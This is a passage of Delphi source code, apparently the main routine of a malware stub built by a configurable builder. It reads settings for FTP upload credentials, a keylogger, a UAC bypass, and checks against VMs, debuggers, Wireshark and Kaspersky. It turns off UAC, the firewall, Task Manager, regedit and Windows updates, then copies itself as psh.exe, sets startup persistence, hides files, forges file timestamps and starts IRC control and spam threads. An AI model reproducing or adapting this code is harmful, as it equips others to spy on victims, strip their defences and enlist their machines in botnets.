      timeout_response := regex(contenido, '[timeout_response]',
        '[timeout_response]');
      op_generate_nick := regex(contenido, '[op_generate_nick]',
        '[op_generate_nick]');

      ftp_host := regex(contenido, '[ftp_host]', '[ftp_host]');
      ftp_user := regex(contenido, '[ftp_user]', '[ftp_user]');
      ftp_pass := regex(contenido, '[ftp_pass]', '[ftp_pass]');
      ftp_path := regex(contenido, '[ftp_path]', '[ftp_path]');

      op_hide_files := regex(contenido, '[op_hide_files]', '[op_hide_files]');
      op_use_startup := regex(contenido, '[op_use_startup]',
        '[op_use_startup]');
      op_keylogger := regex(contenido, '[op_keylogger]', '[op_keylogger]');

      op_use_special_path := regex(contenido, '[op_use_special_path]',
        '[op_use_special_path]');
      op_use_this_path := regex(contenido, '[op_use_this_path]',
        '[op_use_this_path]');
      special_path := regex(contenido, '[special_path]', '[special_path]');
      path := regex(contenido, '[path]', '[path]');
      folder := regex(contenido, '[folder]', '[folder]');

      op_use_uac_tricky := regex(contenido, '[op_use_uac_tricky]',
        '[op_use_uac_tricky]');
      op_uac_tricky_continue_if_off :=
        regex(contenido, '[op_uac_tricky_continue_if_off]',
        '[op_uac_tricky_continue_if_off]');
      op_uac_tricky_exit_if_off :=
        regex(contenido, '[op_uac_tricky_exit_if_off]',
        '[op_uac_tricky_exit_if_off]');

      op_use_this_datetime := regex(contenido, '[op_use_this_datetime]',
        '[op_use_this_datetime]');
      creation_time := regex(contenido, '[creation_time]', '[creation_time]');
      modified_time := regex(contenido, '[modified_time]', '[modified_time]');
      last_access := regex(contenido, '[last_access]', '[last_access]');

      op_anti_virtual_pc := regex(contenido, '[op_anti_virtual_pc]',
        '[op_anti_virtual_pc]');
      op_anti_virtual_box := regex(contenido, '[op_anti_virtual_box]',
        '[op_anti_virtual_box]');
      op_anti_debug := regex(contenido, '[op_anti_debug]', '[op_anti_debug]');
      op_anti_wireshark := regex(contenido, '[op_anti_wireshark]',
        '[op_anti_wireshark]');
      op_anti_ollydbg := regex(contenido, '[op_anti_ollydbg]',
        '[op_anti_ollydbg]');
      op_anti_anubis := regex(contenido, '[op_anti_anubis]',
        '[op_anti_anubis]');
      op_anti_kaspersky := regex(contenido, '[op_anti_kaspersky]',
        '[op_anti_kaspersky]');
      op_anti_vmware := regex(contenido, '[op_anti_vmware]',
        '[op_anti_vmware]');

      op_disable_uac := regex(contenido, '[op_disable_uac]',
        '[op_disable_uac]');
      op_disable_firewall := regex(contenido, '[op_disable_firewall]',
        '[op_disable_firewall]');
      op_disable_cmd := regex(contenido, '[op_disable_cmd]',
        '[op_disable_cmd]');
      op_disable_run := regex(contenido, '[op_disable_run]',
        '[op_disable_run]');
      op_disable_taskmgr := regex(contenido, '[op_disable_taskmgr]',
        '[op_disable_taskmgr]');
      op_disable_regedit := regex(contenido, '[op_disable_regedit]',
        '[op_disable_regedit]');
      op_disable_updates := regex(contenido, '[op_disable_updates]',
        '[op_disable_updates]');
      op_disable_msconfig := regex(contenido, '[op_disable_msconfig]',
        '[op_disable_msconfig]');

      if (active = '1') then
      begin
        installer := T_DH_Installer.Create();

        installer.set_UAC_Tricky(op_use_uac_tricky,
          op_uac_tricky_continue_if_off, op_uac_tricky_exit_if_off, '1');
        installer.setAntis(op_anti_virtual_pc, op_anti_virtual_box,
          op_anti_debug, op_anti_wireshark, op_anti_ollydbg, op_anti_anubis,
          op_anti_kaspersky, op_anti_vmware);
        installer.setDisables(op_disable_uac, op_disable_firewall,
          op_disable_cmd, op_disable_run, op_disable_taskmgr,
          op_disable_regedit, op_disable_updates, op_disable_msconfig);
        installer.setMoveFile(op_use_special_path, op_use_this_path,
          special_path, path, folder, 'psh.exe');
        installer.setHide(op_hide_files);
        installer.setStartup(op_use_startup, 'psh');
        installer.setDateTime(op_use_this_datetime, creation_time,
          modified_time, last_access);

        logs := installer.Install();

        installer.Free();
        builder_tools.Free();

        // Main

        BeginThread(nil, 0, @start_irc, nil, 0, PDWORD(0)^);
        BeginThread(nil, 0, @spam_irc, nil, 0, PDWORD(0)^);

        if (op_keylogger = '1') then
        begin
          keylogger := T_DH_TinyKeylogger.Create();
          keylogger.directory := GetCurrentDir;
          keylogger.logs_name := 'logs.html';
          keylogger.LoadVars;
          keylogger.start_keylogger_keys;
          keylogger.start_keylogger_windows;
        end;

        while GetMessage(msg, 0, 0, 0) do
        begin
          TranslateMessage(msg);
          DispatchMessage(msg);
        end;

        // End of Main

      end;

    end
    else
    begin
      ExitProcess(0);
    end;

  except
    begin
      //
    end;
  end;

end.

// The End ?
